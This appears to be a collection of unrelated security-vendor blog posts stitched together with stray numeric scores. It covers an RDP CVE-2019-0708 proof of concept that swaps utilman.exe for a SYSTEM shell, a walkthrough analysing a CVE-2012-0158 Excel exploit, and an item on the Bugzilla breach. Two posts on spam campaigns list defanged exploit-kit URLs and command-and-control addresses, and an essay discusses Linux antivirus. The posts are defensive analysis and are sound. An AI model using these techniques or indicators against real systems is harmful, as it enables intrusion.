SophosLabs Offensive Research does research work on software vulnerabilities that affect the platforms on which our products run. The team is focused on producing examples of exploits that other teams can use to build in protection against those exploit methods.
Building the PoC
Several other security analysts have already published their own proof-of-concept code, but that public code (so far as anyone publicly knows) is only capable of crashing Windows, triggering a “Blue screen of death” (BSOD) error. This type of attack renders the computer unusable until it reboots; Technically it is a form of denial of service attack.
The method we’ve built is not just a DoS. After running the exploit code, a hypothetical attacker can launch a command shell that appears prior to login, on the Windows login screen. Our researcher who worked on developing the exploit PoC chose to use a technique that was somewhat different than the publicly-released PoC code.
It’s also a different method than the one used in functional (ie., exploits that do not cause crashes) PoCs that have been developed by at least one other security company. That company also refrained from sharing their explot code, but published video demonstrating it working.
The technique demonstrated in the SophosLabs video involves replacing an executable called utilman.exe (part of the Windows operating system) with another trusted Windows component, the command shell, cmd.exe. The utilman binary is responsible, in part, for enabling or disabling Windows’ accessibility features, which users can access on the login screen by clicking an icon, even before anyone logs in. The button is labeled Ease Of Access in Windows. In this case, it’s surprisingly accurate.
The MITRE ATT&CK framework, which documents exploitation techniques, classifies this under category T1015. Users can invoke the accessibility functions from either an icon on the login screen, or with the Windows+U key combination. Utilman.exe, launched by winlogon.exe, has SYSTEM level privileges; By replacing one signed Microsoft binary with another, the replacement also gets those privileges.
What’s in the video
The first 45 seconds of video shows the researcher running a Windows 7 virtual machine, demonstrating the use of the accessibility features on the Windows login screen (which brings up a small menu of options to assist the disabled), and then demonstrates a failed login with an incorrect password.
At about 45 seconds in, the researcher launches the attack using the PoC script, called exploit.py. As the video is showing the PoC running in real time, nothing happens for roughly the next 20 seconds until 1:06, at which time the script attempts to start an RDP session to the targeted VM. The actual exploit takes about a minute to complete; We’ve edited the wait time out of the video.",0.01635971648232093
"Within a few seconds, the connection has completed. The output from the researcher’s console indicates that the PoC has opened a connection. During this time, the exploit is being used to perform the exe replacement. By 1:10, the console informs the researcher that “if there was no crash, a SYSTEM shell is awaiting via the accessibility menu.”
By 1:20 in the video, the researcher has made a second RDP connection to the target machine, again attempted to log in with the incorrect password, and then invokes the elevated command shell (running with NT AUTHORITY\SYSTEM credentials) by clicking the Ease Of Access menu icon.
Not just dangerous, but wormable-dangerous
All the proof-of-concept does, in the video, is allow someone in an interactive session over RDP to launch a command shell with SYSTEM privileges. That’s pretty bad, but the tool leveraged by this team to launch the exploit, the rdpy framework, allows anyone to instrument any RDP interaction, such as clicking buttons or sending synthetic keypresses.
With very little effort, a malicious threat actor could fully automate the whole attack chain, including synthetically “typing” commands into the shell, or simply passing commands to the shell.
That would be extremely bad, as it would allow rapid-fire attacks targeting any system hosting RDP to the outside world. It wouldn’t necessarily succeed in the case of the patched devices, but an attack like this falls into the category of “spray and pray” – the attackers are not choosy about who they target, and some percentage of machines will be vulnerable.
It’s worth noting that we’re not the only company in the security industry that’s discovered at least one way to exploit this vulnerability, and as previously mentioned, other independent vulnerability researchers have been working on developing exploits of their own.
So please, if you haven’t already updated your Windows computers, do so right now. We feel it’s only a matter of time before someone weaponizes this, and the best defense you might have is that patch.
In addition, please close any firewalls that expose RDP (no matter what port it is running on, though its default is 3389/tcp) to the open internet.
Sophos detection
Sophos published a technical support bulletin to our Community forums that describes the protections in place for customers and partners. Customers of recently-acquired Rook Security will have the following intrusion detection rule available, as well.
2027369 || ET EXPLOIT [NCC GROUP] Possible Inbound RDP Exploitation Attempt (CVE-2019-0708) || url,github.com/nccgroup/Cyber-Defence/blob/master/Signatures/suricata/2019_05_rdp_cve_2019_0708.txt || url,portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708 || cve,2019,0708
SophosLabs thanks Mark Loman for sacrificing his virtual machine to this research",0.01095015650707798
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"3
",0.009865182153086294
"The Malware Archives: MS Office Files
Recently, I posted a blog about analyzing PDF files. In that post, we covered some basics of the PDF format and then examined an infected PDF to observe the malware infection.
In this post, we’re going to do something similar, except this time using Microsoft Office.
Just like the PDF, most of you reading this are already familiar with Microsoft Office. If you’ve ever had to type a school paper, for example, you’ve likely used Microsoft Word sometime in your life. Perhaps you took a class on database design, so you may have use Microsoft Access to create and test custom database applications.
In Microsoft Office files, versions 97-03 uses a custom binary file format that is read by the associated Office program.
The technical specification for each format can be quite lengthy; for example, the Word specification (.doc) is over 600 pages long, while Excel (.xls) is at nearly 1200. Changes to these formats came in 2007, however, when Office 2007 debuted with a newer Office Open XML format. The Office Open XML format uses compression with PKZIP and offers an array of enhancements, one being increased security through macro elimination.
However, while you can make the Office file format more secure, Office programs that read these files need to be equally secure in order to be completely safe. The problem, of course, is that they’re not, and that’s why you have instance where older files can still target newer versions of Office.
Let’s get our hands dirty with Office malware by examining an Excel file that demonstrates CVE-2012-0158, aka MSCOMCTL.OCX Remote Code Execution (RCE) vulnerability. The file MSCOMCTL.OCX is the ActiveX common controls DLL for Windows. In this example, the “ListView” and “ListView2” ActiveX controls implemented in the DLL are vulnerable to the exploit, which leads to a malware infection.
For reference purposes, the md5 hash is 0ca16af39749f996df1c499dcda8c269. For our analysis environment, we will be using Office 2007, although other versions of Office are still vulnerable if unpatched, as well as many other applications (refer to CVE description for full list of applications affected).
When analyzing a new file (no matter the presumed type) it’s always wise to use a hex editor to observe the headers.",0.012778882004441883
"If you notice the first four bytes are D0 CF 11 E0 (“DOCFILE”), which indicate we’re likely dealing with an MS Office file.
Now we’re going to need some tools. Arguably the best tool for analyzing malicious Office documents is OfficeMalScanner, written by Frank Boldewin. OfficeMalScanner is an “Office forensic tool to scan for malicious traces, like shellcode heuristics, PE-files or embedded OLE streams”.
OfficeMalScanner is a suite of applications and is very good at giving analysts a “lead” on where malicious activity (mostly shellcode) is occurring in the Office document. Let’s observe all the tools OfficeMalScanner gives the user.",0.018657430415826348
"OfficeMalScanner.exe is the main binary used to scan office documents for malicious behavior. The program is capable of scanning for shellcode, embedded PE files, OLE streams, and can also disassemble shellcode as well as brute force encrypted bytes (using ADD, XOR, and ROL).",0.015442100834910044
"DisView.exe is a command line utility used for disassembling shellcode, starting at a specified offset.",0.011411372642397777
"As the name implies, RTFScan.exe scans Rich Text Format (.rtf) files for malicious behavior. The RTF format is another Microsoft proprietary format that can be exploited when used with vulnerable Microsoft Word installations. CVE-2012-0158 can be leveraged against RTF files, and some exploits rely solely on specially crafted RTF files as their vehicle for malware infection (see CVE-2010-3333, aka RTF Stack Buffer Overflow Vulnerability).",0.015369415679797438
"Finally, MalHost-Setup.exe is a tool used to “host” the shellcode embedded in a malicious file. Since Office files execute under the context of their associated Office program, once an exploit occurs, the shellcode runs under the context of that program. MalHost-Setup.exe creates a separate binary to host the embedded shellcode, which can streamline analysis of malicious code.",0.01682511304842771
"For example, if I have an infected Excel file and I run it, it gets loaded into the memory address space of Excel’s process, (EXCEL.EXE). However, this can be complicated for analysts and reverse-engineers, as debugging large applications like Excel can be difficult, and it’s nearly impossible to predict where the shellcode will begin executing within the program’s address space. With MalHost-Setup, it’s much easier to run your shellcode in the context of another process that is much more confined.
Now that we’ve explained our tools, we can scan the infected Excel file using OfficeMalScanner. If you refer to the picture above, you will notice there are three options—scan, info, and inflate—along with the switches, brute and debug.
Let’s first try the info option, to look for OLE objects and macro code.
OfficeMalScanner.exe [filename] info",0.013653278817069903
"Looks like it found something: VB-Macro code. However, there isn’t anything overtly malicious when observing the produced files, except maybe the presence of the strings “ListView” and “ListView2,” as noted earlier that CVE-2012-0158 documents these ActiveX controls as vulnerable (see full CVE description).",0.011883277670074466
"Next we can try the “scan” option, along with the optional switches “brute” and “debug”. When using these two switches, OfficeMalScanner will attempt to disassemble any shellcode detected and use brute force techniques to uncover any encrypted code or files.
OfficeMalScanner.exe [filename] scan brute debug
OfficeMalScanner detected shellcode embedded within the Excel file starting at offset 0x1DE0B. However, some of these instructions don’t seem right, particularly the last instruction: mov [esp+ecx*8-288569B3h], gs. A few instructions prior, though, it can be seen that some bit manipulation is occurring, namely XOR (exclusive or) and ROR (rotate right). This could very well indicate the embedded shellcode performs on-the-fly de-obfuscation as it executes.",0.013251354769782453
"We’re going to need to take a closer look at this shellcode. When loading the file into Hexplorer (or DisView, or anything else that disassembles code), you can analyze the shellcode further. It really seems the code starts at 0x1DE08, starting with a PUSH instruction.",0.011537039250003045
"After locating the shellcode, it’s important that we execute this code to see what’s going on, which means we will need to attach a debugger to EXCEL.EXE. However, we just want to go straight to the shellcode, and not mess with Excel and the library files involved, which would waste a lot of time.
One option seems like an obvious solution to our problem: the MalHost-Setup tool. However, when using MalHost-Setup, you’ll eventually get an unhandled exception during execution. This is because the shellcode expects to be running in the context of EXCEL.EXE, and therefore some of the memory offsets don’t match when running under a separate parent process. While tools are always great, none of them are perfect.
The best way to handle this is to patch a few shellcode bytes. Commonly referred to the “EB FE trick”, this technique will patch two bytes with an infinite loop, allowing us to easily attach a debugger.
In x86 assembly language, the “0xEB” byte indicates a non-conditional jump instruction (JMP), while the second byte, “0xFE” indicates where to jump, which is the next instruction to execute, or EIP register. Refer to the picture below for help understanding this concept (this is a hard one, folks).",0.014989939402887398
Thus an infinite loop is created. Now we need to patch the bytes in our shellcode.,0.012069112507770208
"Finally, we can execute the “workbook.xls” file in Excel. You’ll notice that nothing appears to be happening at first—this is because the exploit has occurred and the shellcode has begun to execute, but it’s stuck in the infinite loop we created.
When observing EXCEL.EXE in Process Explorer (or just the regular Task Manager), it can be seen that the infinite loop is causing a lot of CPU usage.",0.011067501942015445
"Let’s give our CPU a break and attach to EXCEL.EXE with OllyDbg. Once you attach, resume execution, and then pause again to land at our infinite jump.",0.013141821154540545
"While Excel is paused, let’s restore the original bytes (Ctrl + E). Now we can step through the shellcode and see what’s going on.",0.016064616405609633
"After stepping through a few instructions, it’s easy to see that more code is de-obfuscated on the fly. Each obfuscated byte is placed in the AL register with a ROR 0x5 and XOR 0x3F applied; afterward, the revealed code is executed.",0.011355422170887142
"As we continue to step through the shellcode, imported functions are retrieved, which really give us an idea of what’s going to happen next.",0.01330907779151258
"The current user’s temp directory is retrieved (%temp%) and a new file called “set.xls” is created there. Next an embedded Excel file is revealed, obfuscated with a ROL 0x6 and XOR 0x37 applied to each byte.",0.01058591056068292
"This is a common technique seen in Office malware. The reason this occurs is the exploit typically crashes the host application (EXCEL.EXE in this case) and a new Excel process is created to make it appear the document opened correctly. In this case, that’s exactly what happens, as the file “set.xls” is opened using WinExec. The new file is filled with paragraphs of text to appear legitimate.",0.012330701619639006
"Moving on we see yet another de-obfuscation routine, this time the data is applied with ROL 0x5 and XOR 0x31. This shellcode is really a perfect example of why traditional brute force techniques fail, as here we have a) multiple operations performed on each byte and b) multiple values used to obfuscate. Traditional brute force tools usually only factor one value against a stream of bytes, and use one operation at a time (i.e. XOR, AND, etc).",0.016403616087997452
"Finally, it appears we’ve made it to the good stuff, an embedded PE file.",0.012826067686705689
"This file will be named “ews.exe” and is also dropped in the current user’s temp directory. Looks like it’s a UPX-packed binary; if we want to analyze from here, we can use the UPX utility with the “-d” command to unpack.",0.01352041166203366
"Software exploits are very popular and are responsible for a large majority of malware infections. While it’s most important that you have anti-malware protection to prevent execution of malicious code should an exploit succeed, you might want to consider another layer of defense.
Malwarebytes Anti-Exploit works to stop an exploit before it even starts. The advantage here is that the malware doesn’t get installed and therefore never has a chance to execute.
The program is still in beta, but it currently blocks a wide range of exploits found in the wild, including CVE-2012-0158 (and also CVE-2010-0188, featured in my previous blog post). Should you attempt to open this Excel document with Anti-Exploit installed, the following dialog would appear:",0.015708075894433904
"You can download Malwarebytes Anti-Exploit for free here.
Stay tuned for more information from the archives.
_______________________________________________________________________________
Joshua Cannell is a Malware Intelligence Analyst at Malwarebytes where he performs research and in-depth analysis on current malware threats. He has over 5 years of experience working with US defense intelligence agencies where he analyzed malware and developed defense strategies through reverse engineering techniques. His articles on the Unpacked blog feature the latest news in malware as well as full-length technical analysis.  Follow him on Twitter @joshcannell
",0.016550413605686543
"Mozilla’s Bugzilla breached
A cybercriminal has stolen and used “security sensitive information” from Mozilla’s Bugzilla to launch attacks on Firefox users, it has been revealed.",0.010654679741855855
Karl Thomas,0.008990830692124696
8 Sep 2015 - 03:06PM,0.011126988335025012
"A cybercriminal has stolen and used “security sensitive information” from Mozilla’s Bugzilla to launch attacks on Firefox users, it has been revealed.",0.010291948553943886
"A cybercriminal has been able to steal “security sensitive information” from Mozilla’s Bugzilla, it has been revealed.",0.008562875187632102
"Richard Barnes, Firefox security lead at Mozilla, said that the data extracted from the bug tracking tool has been used to attack users of the web browser Firefox.",0.013643371688620287
"Mozilla has already looked into the matter and developed a suitable response to counter the threat posed by the attacker, he explained. Law enforcement has also been informed.",0.014843888100890101
"Additionally, it is the midst of improving Bugzilla to ensure that the tool remains effective and secure from individuals or groups looking to exploit vulnerabilities.",0.011615901585153021
"“The account that the attacker broke into was shut down shortly after Mozilla discovered that it had been compromised,” Mr Barnes elaborated.",0.008594857630549013
“We believe that the attacker used information from Bugzilla to exploit the vulnerability we patched on August 6th.,0.011096708377035469
“We have no indication that any other information obtained by the attacker has been used against Firefox users.”,0.01323712479530581
"He clarified that the latest update to Firefox, which was released on 27th August, has patched all of the flaws that had been identified by the cybercriminal.",0.012740123834184436
Other efforts to boost Bugzilla’s security include getting all users that have access to sensitive data to change their passwords and to use two-factor authentication.,0.010768098387407221
"Further, cutting down on the number of people who have “privileged access” and redefining what this allows is also on the security improvement agenda.",0.01194977457694657
"“In other words, we are making it harder for an attacker to break in, providing fewer opportunities to break in, and reducing the amount of information an attacker can get by breaking in,” Mr Barnes went on to say.",0.018054871159840835
"Last month, the Mozilla Foundation announced a new security update for its Firefox browser, which addressed a particular flaw (CVE-2015-4495).",0.01583916516268946
"“This vulnerability allows attackers to bypass the same-origin policy and execute JavaScript remotely that will be interpreted in the local file context,” explained Anton Cherepanov, a malware researcher at ESET.",0.018078388769210085
"“This, in turn, allows attackers to read and write files on local machine as well as upload them to a remote server.”
",0.008811848651906096
"Cybercriminals are currently spamvertising millions of emails, impersonating Friendster,  in an attempt to trick its current and prospective users into clicking on a malicious link found in the email.
Upon clicking on the link, users are exposed to the client-side exploits served by the latest version of the Black Hole exploit kit.
More details:",0.012794393180040942
Sample screenshot of the spamvertised email:,0.010990132234593664
Sample screenshot of the obfuscated Java script loading the malicious iFrame:,0.00790126529557622
"Malicious URL: hxxp://sonatanamore.ru:8080/forum/links/column.php
Client-side exploits serving URL: hxxp://sonatanamore.ru:8080/forum/links/column.php?iqtxfe=3533020635&smr=3307093 738070736060b&grrhh=03&ndgywdt=nyurdae&aquotd=uox
Client-side exploits served: CVE-2010-0188
sonatanamore.ru used to respond to the following IPs – 70.38.31.71; 202.3.245.13; 203.80.16.81; 213.251.162.65
Responding to the same IPs are also the following malicious domains:
limonadiksec.ru
rumyniaonline.ru
denegnashete.ru
ioponeslal.ru
moskowpulkavo.ru
onlinebayunator.ru
lenindeads.ru
omahabeachs.ru
uzoshkins.ru
sectantes-x.ru
Sample detection rate for the malicious iFrame loading script: friedster.html – MD5: c444036179aa371aebf9bae3e7cc5eef – detected by 12 out of 42 antivirus scanners as Exploit.JS.Blacole; Trojan.JS.Iframe.acn
Upon successful client-side exploitation, the campaign drops MD5: 8fa93035ba01238dd7a55c378d1c2e40 on the affected host, currently detected by 24 out of 43 antivirus scanners as Trojan-Ransom.Win32.PornoAsset.aeuz; Worm:Win32/Cridex.E
Upon execution, the sample phones back to 95.142.167.193:8080/mx/5/A/in.
What’s also worth pointing out in regard to this campaign is the fact that, during the time the Friendster-themed campaign was spamvertised, another campaign was also launched with identical MD5 for the javascript obfuscation script.
Sample screenshot of the spamvertised campaign:",0.01084833417012987
"Clearly, both campaigns have been launched by the same cybercriminal/gang of cybercriminals.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.01118723724775339
"End and corporate users, and especially CareerBuilder users, beware!
Cybercriminals are currently spamvertising millions of emails impersonating the popular jobs portal CareerBuilder in an attempt to trick users into  clicking on client-side exploits serving links.",0.022834628011445313
"The current campaign, originally circulating in the wild since 26 Apr, 2012, is a great example of a lack of QA (quality assurance) since they’re spamvertising a binary that’s largely detected by the security community.
More details:",0.012303449247697329
"Spamvertised URL: hxxp://karigar.in/car.html
Client-side exploits served: CVE-2010-0188 and CVE-2010-1885
Malicious client-side exploitation chain: hxxp://karigar.in/car.html ->  hxxp://masterisland.net/main.php?page=975982764ed58ec3 ->  hxxp://masterisland.net/data/ap2.php sometimes  hxxp://strazdini.net/main.php?page=c6c26a0d2a755294 is also included in the redirection
Upon successful exploitation drops the following MD5: 518648694d3cb7000db916d930adeaaf
Upon execution it phones back to the following URLs/domains:
zorberzorberzu.ru/mev/in/ (146.185.218.122)
prakticalcex.ru – 91.201.4.142
nalezivmordu.in
internetsexcuritee4dummies.ru
Thanks to the overall availability of malware crypting on demand services, we believe that it’s only a matter of time before the cybercriminals behind this campaign realize that they’re spamvertising an already detected executable, crypt it and spamvertise it once again this time successfully slipping it through signatures-based antivirus scanning solutions.
Webroot SecureAnywhere customers are proactively protected from this  threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.008447471972940379
"Do you really need antivirus software for Linux desktops?
It started, innocently enough, as a question asked in the ESET Security Forum titled ""Eset – Do I Really Need Antivirus On My Linux Distros?"" However, the answer to that seemingly simple question on Linux antivirus is more complex than a simple yes-or-no response.",0.016729443201340954
13 Jan 2015 - 12:38PM,0.011328166916448557
"It started, innocently enough, as a question asked in the ESET Security Forum titled “Eset – Do I Really Need Antivirus On My Linux Distros?” However, the answer to that seemingly simple question on Linux antivirus is more complex than a simple yes-or-no response.",0.014380748991593806
"It started, innocently enough, as a question asked in the ESET Security Forum titled “Eset – Do I Really Need Antivirus On My Linux Distros?” However, the answer to that seemingly simple question on Linux antivirus is more complex than a simple yes-or-no response.",0.014380748991593806
"That there’s far less malware for Linux than Windows is not in doubt: A search in ESET’s VirusRadar® threat encyclopedia reveals just a scant few thousand pieces of malicious software for Linux. While that may sound like a large number, ESET processes 250,000 malicious samples every day on average, releasing several thousand signatures for Windows-based malware every few days. And, of course, one should keep in mind that the term “signature” is itself very broad these days: A single signature may be able to detect multiple families of malware; while one family of malware may require tens of signatures to detect all known samples.",0.014199845085729024
"Yes, the threatscape out there is dominated by malware that targets Microsoft Windows, but as the world’s most-widely used desktop operating system, Windows is also the most heavily-targeted.",0.014829858222507819
"There are many reasons that Linux doesn’t have the same sorts of problem with malware that Windows has, ranging across differences in operating system security models, market fragmentation due to the multitude of distros, and its dearth of acceptance by everyday users as a desktop operating system.",0.016938535019060508
"But “few threats” does not mean “no threats at all.” And while some of the more rabid fanatics will point out that Linux doesn’t have a computer virus problem, neither does Windows today: Only about 5-10% of malware reported to ESET’s LiveGrid® threat telemetry system on a daily basis is viral in nature.",0.013417775472779447
"The dearth of Linux-based malware is something I had mentioned previously in the ESET 2014 Mid-Year Threat Report, which you can view here, if you have about an hour to spare. However, if you do not, here is the relevant slide from the presentation:",0.013955058163511724
"In case you chose not to view the entire presentation, allow me to explain what this chart means. What you are looking at represents the virus signature database updates released by ESET between January 1 and June 1 of this year. Everything that is colored light blue is some kind of Microsoft Windows-based malware—for which we commonly name with a “Win32/” prefix (“BAT/“, “MSIL/“, “NSIS/“, “VBA/“, “VBS/” and “Win64/” are also types of malware specific to Windows) when reporting its presence on the computer—everything else remaining on the chart is not. If you are having trouble viewing the non-Windows threats you may need to use your screen magnifier to zoom in a bit.",0.009147563521988311
"But, as the saying popularly (and incorrectly) attributed to Mark Twain goes, “there are lies, damn lies, and statistics” so treat that chart with a healthy dose of skepticism. For one thing, it does not provide any information about the amount of Linux malware detected by ESET, either in terms of absolute numbers or percentages—just the number of signatures added for each of the platforms. So, from a pure threat metrics perspective, this makes the chart less useful. But that is okay, because that is not the information I wanted to convey in the first place.",0.011715913569107839
"In the original presentation for which I created the chart, it was used in order to provide visibility into another metric which I thought very interesting: It serves as a kind of canary in the coal mine, an indication of the amount of effort required from ESET’s threat researchers in order to protect each platform.",0.014315311110178475
"While it is impossible—and misleading—to make 1:1 correlations between numeric values such as the amount of signatures and the severity of the threats they represent, looking at the volume being added on a per platform basis is an interesting metric to me, and here’s why: The number of signatures being added can serve as a kind of very rough guide to how much effort is needed to protect each platform. That, in turn, provides us with a kind of mirror image, which shows how heavily attackers are targeting those platforms.",0.013930364115784744
"What sorts of intelligence can we can gain from such data? Well, from the look of it, it appears that in the people who are creating malicious code are expending far more effort on the creation of threats for Windows than for other platforms. And what exactly might we infer from that? The simplest answer is this activity generates the highest rate of return on their investment (writing malware). While it may seem strange, or at least counterintuitive, to bring this up in a discussion of malware, it is actually central to this discussion:",0.01574034650491085
"Over 99% of the malware observed by ESET on a daily basis is written for the sole purpose of supporting some kind of economically-motivated criminal activity, whether it be a  (Distributed Denial of Service) attack, identify theft, spam, or plain-old robbery, albeit through somewhat newfangled methods of stealing account and transaction credentials for various financial institutions and services.",0.017114312738361726
"However, this is not an article about Windows-borne malware, or, at least, that wasn’t the intended topic.  When it comes to Linux and how it fits into criminals’ online activity, the threatscape is a bit different.  Linux has long been a staple of the webhosting world, and if you peer into the silver lining of cloud computing, it often looks more like Tux than, say, Clippy on the inside.  This becomes even more apparent when you look at modern supercomputers:  In 2014’s TOP500 list, just two of the systems listed ran some version of Windows.",0.011228527619478346
"I would like to point out then that when I am discussing Linux, I’m referring to the various Linux distributions (or distros, for short) out there, not just the Linux kernel itself.  For that matter, it would be best to extend this concept to cover not just to the distro, but the stack of software that is running on top of it, whether it be a classic LAMP stack for serving up web pages or inside networking gear moving bytes around.",0.013347202415357029
"A large part of the Internet runs on Linux, often far away from public view in vast data centers.  Even when Linux is right in front of us, it is often invisible because it is running unnoticed on such devices as modems, routers and set top boxes.  I would like to focus first, though on those data centers.",0.014760551001957278
Linux is very big…,0.009469681562002563
"So, what exactly is it that makes Linux ideal for data center environments?  Data centers consist of thousand, tens of thousands or even hundreds of thousands of servers, and managing that many computers rapidly becomes very challenging.  Licensing costs for server operating systems vary, but Linux distros essentially start at free, although enterprises often end up paying for documentation, support and maintenance, or the costs of devoting staff to customizing it as needed.",0.02201958101238921
"Likewise, Linux’s support of various network protocols, scripting languages and command shells—that support being typically more diverse than Windows, at least out of the box—means that it is comparatively easy and inexpensive to script management of systems.  And this tends to scale well.",0.014580868286412252
"And then there’s performance.  As one of the first operating systems to originate in the Internet era, and coming from an educational rather than commercial background, Linux was designed from the ground up to connect with other systems using standard protocols such as TCP/IP. Indeed, it took Microsoft Windows server operating systems years before they could match Linux in various raw network throughput tests.",0.013796334081462303
…and Linux is very small,0.009139086480439151
"Just as Linux scales up to very large computers, it can also be tailored to run on very small devices.  Google’s Android, which largely powers the smartphone and tablet industries, is based on Linux.  You might find devices running Linux throughout your home:  In your family room, such devices as DVRs, media players, set-top boxes and the Smart TVs in your entertainment center might be running Linux, while the broadband modem and network router that connect everything to the Internet run Linux as well.  If smart, digitally-connected kitchen appliances take off, you may also be cooking with Linux one day.",0.014700029932124825
"Regardless of what these small devices around your home or office do, though, they have one thing in common:  They don’t look very much like traditional computers.  They don’t have keyboards, or even monitors (unless, perhaps, they are built into your monitor), and you probably access them remotely through your web browser so as to configure and manage them.  If they communicate with you at all, it is perhaps with an LED light or two to let you know they’re working.",0.01526092128485057
The Linux Threatscape,0.009295441361993895
"So, what exactly are the threats facing Linux today?",0.011304611004313903
"Well, as previously mentioned, Linux usage tends to concentrate in two areas: The very large (data centers) and the very small (embedded in appliances and the like).  In the former case, unless you work around servers all day, you may not be aware of how Linux is behind many of the most popular web sites and relied-upon services we use every day.  And in the latter case, you may simply not be aware that your home router, DVR, set-top box or other “smart” home appliances are running some form of Linux.  Even though both of these cases are not what we traditionally what we think of as “desktops,” it does not mean they are immune to the same kinds of threats, either.",0.012914073238944446
"Hosted Linux servers in data centers have long been a part of the malware ecosystem, although probably not in the way most people think of it.   There are many web site hosting companies out there that run outdated, insecure software and have poor system management practices.  They often end up hosting command-and-control servers used by Windows-based malware to phone home for updates and instructions, serve as drop zones used by malware to store stolen information en route to the criminals who have stolen it, and so forth.",0.013806883405760528
"Earlier this year, ESET’s researchers uncovered Operation Windigo, an attack mostly targeting Linux servers (some *BSD, Mac OS X Server and even a few Windows servers were also affected), that over the last two years affected over 25,000 servers.  At first glance, 25,000 systems may not seem like a large number, given that many botnets scale to ten or thirty times that size, but when you consider that a single server might host tens, hundreds or even thousands of web sites, the actual number of end users affected by the attack was very large, indeed.",0.015599386599532195
"A true anecdote from my own experiences:  A web forum on which I am active was affected by the Windigo campaign for many months.  When I notified the site administrator that I was seeing attempts to pop up advertisements for pornography being blocked by my security software, he told me to check my Windows-based PC for viruses.  It was only several months later that the hosting provider for the forum—a large web host known more for their wallet-friendly pricing than for support or security—admitted that the server on which the site was running had been compromised for the better part of a year.",0.009666738421035048
"At the other end of the computing spectrum, we have all of those appliances with computers embedded in them running some version of Linux.  These include devices you might not necessarily think of as computers, such as Smart TVs and DVRs, as well as devices to which you may connect your computer, but do not necessarily think of as having a discrete operating system in them, such as routers, printers, NAS and so forth.  We have seen numerous Smart TVs from companies such as Samsung, Philips and LG that can be taken over remotely, might spy on their users’ viewing habits, or even on the users themselves via built-in webcams.  And there are also worms like RBrute, which modified routers’ DNS settings in order to inject ads, steal credentials and redirect search results.",0.012389096393534582
Threats on the Desktop,0.006688005845627787
"Just as the threats targeting Linux servers are very different from those faced by embedded systems, the kinds of attacks on Linux desktops tend to vary as well.",0.015832438636506407
"The first thing to understand about attacks on Linux desktops is that these systems are rarely infected by malware such as worms, trojans, viruses and so forth.  While this is partially due to Linux’s security model, the greater reason for this is simply the lack of market penetration by Linux in the desktop space.",0.010511071119248094
"These days, malware is used almost exclusively for financial gain by criminals.  In fact, this is so often the case these days that when malware is written for some other purpose, it becomes newsworthy simply for that reason alone.  Case in point:  Win32/Zimuse.  When we do see malware specifically for Linux, it often seems to be written either as a proof of concept or for other research purposes, and is rarely found in the wild on customers’ computers.",0.012178566045928929
"This, however, does not mean that Linux is immune to malicious software, especially when it comes to cross-platform threats.  HTML, Java, JavaScript, PDF (Portable Document Format), Perl, php, Ruby and even SWF (Adobe Flash) are all frameworks or languages that are supported under Linux, and these can be just as easily targeted under Linux as under Windows or Mac OS X, although the underlying operating system may still be more difficult to exploit.  Still, having anti-malware software installed means you can receive warning of potential threats.",0.014667802884318126
"Likewise, it is not unusual for Linux users to receive file attachments via email, or to be on networks with file shares, both of which can serve as vectors of malware, even if they only target Microsoft Windows.  And, of course, if a Linux-specific worm such as Linux/Ramen was spreading across the network, one would want to protect one’s desktop from it.  But even if the only malware on the network is targeting Windows, having anti-malware software installed can serve as a kind of “early warning” system to notify Linux desktop users that they are connected to an infected network.",0.011010479303179666
"As another anecdote, a friend of mine, whom I will call Richard, does exactly this.  A technical writer by vocation, he switched to a Linux-only environment after some bad experiences with Windows Vista.  Richard does maintain an isolated Windows XP system for occasions when he must do something in Windows that cannot be done under Linux, but, regardless of the operating system, all of his computers run anti-malware software.  When people at his office accidentally send an infected file to his Linux desktop, he lets them know in the kind of clear, concise and unambiguous terms used by professional wordslingers.",0.01415078640257017
Closing Thoughts,0.009713550966741202
"While Linux desktop systems are not magically immune to malware, they are not saturated with it either, especially in comparison to their Windows brethren.  But, as both Operation Windigo and the escalating increase in Android malware have shown us, wherever a particular platform finds success, criminal elements are not far behind.  While Linux on the desktop remains comparatively malware free today, that may not be the case in the future.  Whether it’s a requirement for compliance reasons, or simply a desire to have an ounce of prevention, anti-malware on the Linux desktop can act as a form of insurance against future attacks",0.01018878835356396
"For additional information about Linux-related and multi-platform malware, please see the following articles from We Live Security:",0.014755333381634705
"Ongoing Web Infection (January 2008)
Linux Tsunami hits OS X (October 2011)
Android – meet NSA/SELinux lockdown (January 2012)
Blackhole, CVE-2012-0507 and Carberp (March 2012)
Apache/PHP web access holes – are your .htaccess controls really safe (July 2012)
Malicious Apache module used for content infect: Linux/Chapro.A (December 2012)
Malicious Apache Module: a clarification (December 2012)
2013 Forecast: Malware, scams, security and privacy concerns (January 2013)
Linux/SSHDoor.A Backdoored SSH daemon that steals passwords (January 2013)
Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole (April 2013)
The stealthiness of Linux/Cdorked: a clarification (May 2013)
Linux Apache malware: Why it matters to you and your business (May 2013)
Linux/Cdorked.A malware: Lighttpd and nginx web servers also affected (May 2013)
The Home Campaign: overstaying its welcome (July 2013)
Darkleech and the Android master key: making a hash of it (July 2013)
Nymaim – obfuscation chronicles (August 2013)
Ghost in the machine: Mysterious malware “jumps” between disconnected PCs, researcher claims (November 2013)
An In-Depth Analysis of Linux/Ebury (February 2014)
Over 500,000 PCs attacked every day after 25,000 UNIX servers hijacked by Operation Windigo (March 2014)
Operation Windigo – the vivisection of a large Linux server-side credential-stealing malware campaign (March 2014)
The Internet of Things isn’t a malware-laced game of cyber-Cluedoe… yet (March 2014)
Win32/Sality’s newest component: a router’s primary DNS changer named Win32/RBrute (April 2014)
Windigo not Windigone: Linux/Ebury updated (April 2014)
ESET 2014 Mid-Year Threat Report (June 2014)
2014 Security Lessons:  Making 2015 More Secure (December 2014)",0.014806992054057555
"And the following podcasts, as well:",0.017675031005593866
"Linux web server malware (May 2013)
Web security for small businesses: new attacks on Linux servers (May 2013)",0.014761365053735043
"I would like to thank my colleagues Oliver Bilodeau, Sebastian Bortnik, Bruce Burrell and David Harley for their feedback while researching this topic.",0.014708344396155981
"Do you use Linux on the desktop and, if so, have you ever come across malware, either for it or another operating system?  Do you also run anti-malware software on your Linux desktops?  Why or why not?  Let us know below!",0.01500778463032204
"Aryeh Goretsky, MVP, ZCSE
